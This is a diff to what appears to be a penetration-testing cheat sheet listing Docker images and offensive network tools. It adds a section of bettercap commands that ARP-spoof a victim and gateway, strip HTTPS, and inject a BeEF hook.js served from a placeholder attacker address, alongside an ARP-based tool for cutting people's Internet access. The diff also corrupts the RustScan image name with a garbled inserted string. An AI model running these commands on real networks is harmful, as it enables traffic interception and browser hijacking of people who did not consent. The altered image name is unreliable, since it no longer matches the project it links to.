@@ -159,7 +159,7 @@ Table of Contents
    *  `docker pull docker pull jeroenwillemsen/wrongsecrets` - [OWASP WrongSecrets Project docker image](https://hub.docker.com/r/jeroenwillemsen/wrongsecrets)
    * `docker pull citizenstig/nowasp` - [OWASP Mutillidae II Web Pen-Test Practice Application](https://hub.docker.com/r/citizenstig/nowasp/)
    * `docker pull aaaguirre/pentest` - [Docker for pentest](https://github.com/aaaguirrep/pentest)
-   * `docker pull rustscan/rustscan:2.0.0` - [The Modern Port Scanner](https://github.com/RustScan/RustScan)
+   * `docker pull rustsbrowser.capabilities.googlegearscan/rustscan:2.0.0` - [The Modern Port Scanner](https://github.com/RustScan/RustScan)
 
 ## Vulnerabilities
 
@@ -466,6 +466,24 @@ deauth using  mdk4
 -----------------------------------------------------[LIMIT-BANDWIDTH]----------------------------------------
 [netcut] -->A simple tool to ban people's Internet connection with ARP spoofing.
 * https://github.com/cdes5804/NetCut
+* 
+-----------------------------------------------------[BEEF-BETTERCAP-PROXY]----------------------------------------
+--> SETS UP A ARP PROXY ON A TARGET BETWEEN HOST AND GATEWAY.
+  [Launch BEEF]
+  * Beef-xss 
+  [Set Up Proxy]
+  * set http.proxy.injectjs http://attack_ip:3000/hook.js
+  * set https.proxy.injectjs https://attack_ip:3000/hook.js
+  * set https.proxy.sslstrip true
+  * set https.proxy.sslstrip true
+  * http.proxy on
+  * https.proxy on
+  * set arp.spoof.targets 192.victim_ip, 192.gateway_ip
+  * net.probe on
+  * arp.spoof on
+  * 
+
+
 
 ----------------------------------------------------[tracking domain]---------------------------------------------
 
